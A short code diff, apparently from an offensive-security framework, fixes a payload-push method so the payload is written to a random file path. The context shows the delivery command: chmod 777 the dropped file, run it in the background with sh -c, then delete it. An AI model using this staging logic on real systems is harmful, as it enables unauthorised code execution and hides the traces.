@@ -43,7 +43,7 @@ class Post(Push, StringTools):
             filename = self.random_string(8)
             path = location + '/' + filename
 
-            self.post_methods[method].push(payload, sender, location, args, linemax)
+            self.post_methods[method].push(payload, sender, path, args, linemax)
 
             self.badges.print_process("Executing payload...")
             sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} &\" {delim} rm {path}")
